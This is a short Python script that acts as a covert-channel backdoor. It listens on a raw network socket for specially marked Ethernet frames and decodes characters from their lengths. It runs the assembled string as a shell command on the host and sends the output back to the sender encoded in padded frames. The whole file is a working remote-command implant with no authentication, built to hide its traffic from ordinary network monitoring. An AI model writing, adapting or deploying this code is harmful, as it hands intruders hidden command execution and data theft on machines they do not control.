from socket import *
import subprocess
# ZEROETH_ROUTING_MIN.PY
interface = "ens33" # Your network interface
nodeaddr = 1 # Range is 0 through 3

def sendData(inData,inSock,isLast,dstNode):
    baseByte = 1 # This sets the multicast bit
    srcNode  = nodeaddr << 2 # This is where our node address goes
    dstNode  = dstNode << 4 # This is who we are sending to
    baseByte = baseByte | srcNode
    baseByte = baseByte | dstNode
    framee = b""
    if isLast:
      baseByte = baseByte | 0x40
    framee += baseByte.to_bytes(1,'big')
    framee += b"\x00" * 63 # The rest is just padding.
    framee += b"\x00" * inData # Creates a frame with null bytes that add up to the bytes value
    inSock.send(framee)

def encodeMessage(inData, inSock, dstNode):
    endchar = 0
    for i in inData:
        sendData(i,inSock,0,dstNode)
    sendData(endchar,inSock,1,dstNode)

def getAsciiChar(inData):
    decodedpkt = len(inData) - 0x40
    return chr(decodedpkt)

def runCmd(inCmd):
    inCmdList = inCmd.split()
    inCmdList.pop()
    out = subprocess.run(inCmdList, capture_output=True)
    #print(out.stdout)
    return out.stdout

# Receive
r = socket(AF_PACKET, SOCK_RAW, ntohs(0x0003))
# Transmit 
t = socket(AF_PACKET, SOCK_RAW)
t.bind((interface, 0))

databuf = ""

while True:
    # What we need for our message
    packet = r.recvfrom(65565)
    packet = packet[0]
    byte0  = packet[0] # The very first byte 
    ethtype = packet[12:14] # We want to check if this is our type
    if ethtype == b"\x00\x00":
        # Check the first byte now to see if it's multicast
        if byte0 & 1:
            #if byte0 & 0x80:
            #    bindata = 1 # Check the mode, this isn't implemented yet
            dst = byte0 & 0x30 # This preserves bits 5 and 6
            dst = dst >> 4     # Turn this into a value
            src = byte0 & 0x0C # This preserves bits 3 and 4
            src = src >> 2     # Turn this into a value
            if dst == nodeaddr: # This is for us
                #print("DST: {} SRC: {}".format(dst, src))
                decodedpkt = len(packet) - 0x40
                databuf += chr(decodedpkt)
                if byte0 & 0x40:
                    cmdOut = runCmd(databuf)
                    encodeMessage(cmdOut,t,src)
                    databuf = ""
